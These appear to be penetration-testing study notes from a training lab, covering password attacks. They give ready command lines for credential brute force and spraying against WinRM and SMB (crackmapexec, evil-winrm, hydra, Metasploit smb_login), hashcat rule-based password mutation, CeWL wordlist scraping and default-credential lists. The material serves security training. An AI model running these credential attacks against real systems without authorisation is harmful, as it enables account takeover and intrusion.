## Network Services

#### WinRM
[Windows Remote Management](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)
Microsoft's Implementation of [Web Services Management Protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) which is based of [Simple Object Access Protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary)

Must be activated and configured manually in WinRM
Often used with certificates or specific authentication mechanisms to increase security. 

Ports 5985 (HTTP) and 5986 (HTTPS)

##### [Crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec) 
Get username + password
```shell
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

##### Evil-WinRM
Login
```shell
evil-winrm -i <target-IP> -u <username> -p <password>
```

##### Hydra 

RDP, SSH

### SMB

```shell
hydra -L user.list -P password.list smb://10.129.42.197
```

```shell
msf6 > use auxiliary/scanner/smb/smb_login
```

```shell
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```


## Password Mutations 

#### Hashcat modifications

|**Function**|**Description**|
|---|---|
|`:`|Do nothing.|
|`l`|Lowercase all letters.|
|`u`|Uppercase all letters.|
|`c`|Capitalize the first letter and lowercase others.|
|`sXY`|Replace all instances of X with Y.|
|`$!`|Add the exclamation character at the end.|

```shell
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

```shell
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Hashcat custom rules 

```shell
ls /usr/share/hashcat/rules/
```

#### CeWL

Scans words from websites and save them in a list 
-d depth to spider 
-m minimum length
```shell
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

## Password Reuse / Default Passwords

Default Creds

`creds search`
https://github.com/ihebski/DefaultCreds-cheat-sheet

Router Default Creds
https://www.softwaretestinghelp.com/default-router-username-and-password-list/

